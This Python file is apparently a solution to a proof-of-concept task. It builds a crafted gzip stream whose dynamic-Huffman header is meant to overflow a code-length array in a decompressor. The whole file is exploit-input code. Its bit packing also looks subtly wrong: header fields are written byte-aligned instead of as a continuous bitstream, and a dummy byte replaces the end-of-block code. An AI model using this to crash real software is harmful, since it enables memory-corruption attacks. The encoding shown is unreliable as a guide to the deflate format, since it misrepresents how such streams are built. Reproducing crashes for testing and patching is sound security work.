import os
import tempfile
import struct
import subprocess

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Create a minimal gzip stream that triggers the overflow
        # Gzip header (10 bytes)
        gzip_header = b'\x1f\x8b\x08\x00\x00\x00\x00\x00\x00\x03'
        
        # Deflate block with dynamic Huffman codes
        # Block header: final block, dynamic Huffman
        block_header = 0b1 << 0 | 0b10 << 1  # final=1, type=10 (dynamic)
        
        # HLIT = 257 literal codes (0 in 5 bits), HDIST = 0 distance codes,
        # HCLEN = 15 (meaning 19 code length codes)
        hlits = 0  # 257 literal codes
        hdists = 0  # 1 distance code
        hclens = 15  # 19 code length codes
        
        # Code length order: 16,17,18,0,8,7,9,6,10,5,11,4,12,3,13,2,14,1,15
        # We'll set code length for symbol 15 (index 18) to trigger overflow
        # Temporary array is sized 15, but we access index 15-18
        code_lengths = [0] * 19
        code_lengths[18] = 1  # Symbol 15 gets code length 1 (will overflow)
        
        # Build the compressed data
        data = bytearray()
        
        # Add block header (3 bits, but we'll pack into byte)
        data.append(block_header)
        
        # Add HLIT, HDIST, HCLEN (14 bits total, fits in 2 bytes with 2 bits padding)
        # Bits: HLIT(5) + HDIST(5) + HCLEN(4) = 14 bits
        bits = hlits | (hdists << 5) | (hclens << 10)
        data.append(bits & 0xff)
        data.append((bits >> 8) & 0xff)
        
        # Add code length codes (3 bits each, 19 of them)
        # We need 57 bits = 8 bytes
        code_length_bits = 0
        bit_pos = 0
        for i, cl in enumerate(code_lengths):
            code_length_bits |= (cl << bit_pos)
            bit_pos += 3
            
            # Write every 8 bits
            while bit_pos >= 8:
                data.append(code_length_bits & 0xff)
                code_length_bits >>= 8
                bit_pos -= 8
        
        # Write remaining bits
        if bit_pos > 0:
            data.append(code_length_bits & 0xff)
        
        # Add zero compressed data and end-of-block
        # Just add end-of-block code (256) with zero extra bits
        data.append(0x00)  # Some dummy byte
        
        # Calculate CRC32 and size for gzip footer
        # We'll use empty uncompressed data
        crc32 = 0x00000000
        uncompressed_size = 0x00000000
        
        # Build final gzip stream
        poc = gzip_header + bytes(data) + struct.pack('<I', crc32) + struct.pack('<I', uncompressed_size)
        
        return poc
